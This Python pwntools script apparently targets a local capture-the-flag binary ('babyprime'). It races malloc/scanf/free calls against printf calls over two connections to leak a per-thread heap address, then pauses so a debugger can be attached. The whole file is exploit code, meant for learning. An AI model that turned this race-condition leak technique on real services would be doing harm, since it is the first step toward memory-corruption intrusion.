import time 
from pwn import *
import os

def leak_perthread_addr(r1, r2):
    print("Starting race condition...")
    
    if os.fork() == 0:
        # Child process: spam malloc/scanf/free operations
        for i in range(10000):  # Slightly more iterations for better chance
            try:
                r1.sendline(b"malloc")
                r1.sendline(b"0")
                r1.sendline(b"scanf") 
                r1.sendline(b"0")
                r1.sendline(b"B" * 16)
                r1.sendline(b"free")
                r1.sendline(b"0")
                if i % 100 == 0:
                    print(f"Child: {i} iterations done")
            except:
                break
        print("Child process finishing...")
        exit(0)
    else:
        # Parent process: spam printf operations
        for i in range(10000):
            try:
                r2.sendline(b"printf")
                r2.sendline(b"0")
                if i % 100 == 0:
                    print(f"Parent: {i} iterations done")
            except:
                break
        
        print("Waiting for child to finish...")
        os.wait()
        
        print("Collecting output...")
        time.sleep(0.3)  # Slightly longer wait
        
        try:
            output = r2.recv(timeout=3)
        except:
            output = b""
        
        # Look for clean leaks - prioritize longer non-printable sequences
        lines = output.split(b'\n')
        best_leak = None
        
        for line in lines:
            if b'MESSAGE:' in line:
                msg_content = line.split(b'MESSAGE: ', 1)[1]
                
                # Skip obvious input patterns and empty messages
                if (msg_content in [b'NONE', b''] or 
                    msg_content.startswith(b'B') or
                    len(msg_content) < 8):
                    continue
                
                # Look for sequences that start with null bytes (clean heap data)
                if msg_content.startswith(b'\x00') and len(msg_content) >= 8:
                    print(f"Found clean leak: {repr(msg_content)}")
                    try:
                        leak = u64(msg_content[:8])
                        print(f"Clean address: {hex(leak)}")
                        return leak
                    except:
                        continue
                
                # Fallback: any message with multiple non-printable bytes
                nonprint_count = sum(1 for b in msg_content if b < 32 or b > 126)
                if nonprint_count >= 4 and len(msg_content) >= 8:
                    if not best_leak:  # Keep first good candidate
                        best_leak = msg_content
        
        # Process best leak if we found one
        if best_leak:
            print(f"Found potential leak: {repr(best_leak)}")
            try:
                leak = u64(best_leak[:8])
                print(f"Converted to: {hex(leak)}")
                return leak
            except:
                pass
        
        print("No clean leak found")
        return None

# Main execution
print("Starting babyprime...")
p = process('./babyprime_level1.0_patched')
time.sleep(0.5)

print("Establishing connections...")
r1 = remote("localhost", 1337)
r2 = remote("localhost", 1337)

print(f"Main PID: {p.pid}")
print("Both connections established!")

# Perform the leak attempt
perthread_leak = leak_perthread_addr(r1, r2)

if perthread_leak:
    print(f"\n[SUCCESS] Leaked address: {hex(perthread_leak)}")
else:
    print("\n[INFO] No leak detected")

print(f"\nProcess PID: {p.pid}")
print("PAUSED FOR GDB - attach now!")
print(f"Run: gdb -p {p.pid}")
print("Then: info threads")

pause()  # GDB attachment point

print("Cleaning up...")
r1.close()
r2.close()
p.kill()
